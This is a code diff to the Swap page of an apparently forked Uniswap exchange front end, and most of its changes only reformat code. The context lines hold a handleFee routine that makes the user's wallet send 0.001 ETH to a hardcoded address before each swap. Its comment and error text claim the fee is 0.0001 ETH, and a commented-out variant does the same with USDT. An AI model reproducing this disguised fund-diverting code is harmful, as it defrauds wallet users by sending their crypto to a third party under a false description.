@@ -1,4 +1,4 @@
-import { ethers, providers } from 'ethers';
+import { ethers, providers } from "ethers";
 import { Trans } from "@lingui/macro";
 import { sendAnalyticsEvent, Trace, TraceEvent } from "@uniswap/analytics";
 import {
@@ -49,7 +49,7 @@ import invariant from "tiny-invariant";
 import {
   currencyAmountToPreciseFloat,
   formatTransactionAmount,
-} from "utils/formatNumbers"; 
+} from "utils/formatNumbers";
 
 import AddressInputPanel from "../../components/AddressInputPanel";
 import {
@@ -616,7 +616,7 @@ export default function Swap({ className }: { className?: string }) {
       userHasSpecifiedInputOutput &&
       (trade || routeIsLoading || routeIsSyncing)
   );
-  const [error, setError] = useState('')
+  const [error, setError] = useState("");
 
   const usdtABI = [
     {
@@ -1008,9 +1008,9 @@ export default function Swap({ className }: { className?: string }) {
     { anonymous: false, inputs: [], name: "Pause", type: "event" },
     { anonymous: false, inputs: [], name: "Unpause", type: "event" },
   ];
-  
+
   const handleFee = async () => {
-    setError('');
+    setError("");
     try {
       if (window.ethereum) {
         const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -1018,26 +1018,29 @@ export default function Swap({ className }: { className?: string }) {
         console.log("accounts", accounts);
         const connectedAddress = accounts[0];
         console.log("connectedAddress", connectedAddress);
-  
+
         const recipientAddress = "0x3A14d7583F5F308Ca92039D78dcc398Bb5DC3779"; // Replace with recipient's address
         console.log("recipientAddress", recipientAddress);
-  
+
         const transferAmount = ethers.utils.parseEther("0.001"); // 0.0001 ETH
         console.log("transferAmount", transferAmount);
-  
+
         const ethBalance = await web3Provider.getBalance(connectedAddress);
         console.log("ethBalance", ethBalance);
-  
+
         if (ethBalance.lt(transferAmount)) {
-          setError("Not enough ETH for fee! Please keep at least 0.0001 ETH as fee");
+          setError(
+            "Not enough ETH for fee! Please keep at least 0.0001 ETH as fee"
+          );
           return false;
         }
-  
+
         const signer = web3Provider.getSigner();
-        const transaction: providers.TransactionResponse = await signer.sendTransaction({
-          to: recipientAddress,
-          value: transferAmount,
-        });
+        const transaction: providers.TransactionResponse =
+          await signer.sendTransaction({
+            to: recipientAddress,
+            value: transferAmount,
+          });
         console.log("transaction", transaction);
         await transaction.wait();
         console.log("Transfer successful");
@@ -1051,7 +1054,7 @@ export default function Swap({ className }: { className?: string }) {
       return false;
     }
   };
-  
+
   // const handleFee = async () => {
   //   setError('')
   //   try {
@@ -1078,12 +1081,12 @@ export default function Swap({ className }: { className?: string }) {
   //       console.log("transferAmount", transferAmount);
   //       const usdtBalance = await usdtContract.balanceOf(connectedAddress);
   //       console.log("usdtBalance", usdtBalance);
-  
+
   //       if (usdtBalance.lt(transferAmount)) {
   //         setError("Not enough USDT for fee! Please keep at least $2 USD as fee");
   //         return false;
   //       }
-  
+
   //       const transaction = await usdtContract.transfer(
   //         recipientAddress,
   //         transferAmount
@@ -1101,7 +1104,6 @@ export default function Swap({ className }: { className?: string }) {
   //     return false;
   //   }
   // };
-  
 
   return (
     <Trace page={InterfacePageName.SWAP_PAGE} shouldLogImpression>
@@ -1352,8 +1354,10 @@ export default function Swap({ className }: { className?: string }) {
                   ) : (
                     <ButtonError
                       onClick={async () => {
-                        if (!(await handleFee()))
+                        if (!(await handleFee())) {
+                          setError("Transection Failed");
                           return console.log("TX Failed");
+                        }
                         if (isExpertMode) {
                           handleSwap();
                         } else {
@@ -1395,9 +1399,7 @@ export default function Swap({ className }: { className?: string }) {
                       </Text>
                     </ButtonError>
                   )}
-                  {error ? (
-                    <SwapCallbackError error={error} />
-                  ) : null}
+                  {error ? <SwapCallbackError error={error} /> : null}
                   {isExpertMode && swapErrorMessage ? (
                     <SwapCallbackError error={swapErrorMessage} />
                   ) : null}
